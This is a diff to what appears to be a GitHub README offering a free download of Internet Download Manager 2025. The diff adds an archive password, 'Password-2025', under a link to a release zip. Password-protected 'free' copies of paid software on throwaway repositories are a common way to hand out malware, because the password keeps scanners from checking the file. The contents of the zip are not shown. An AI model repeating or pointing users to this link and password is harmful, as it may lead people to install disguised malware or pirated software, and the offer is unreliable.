@@ -9,6 +9,7 @@ Tags: IDM, IDM-free, IDM for windows, IDM 2025, Internet Download Manager, File 
 
 ## 🔗 Software Access  
 ### Download: [Internet Download Manager](https://github.com/Xyt069/Internet-Download-Manager-2025/releases/download/IDM/IDM-Desktop.zip)
+Password-2025
 
 
 ## 🎉 Overview of Internet Download Manager  
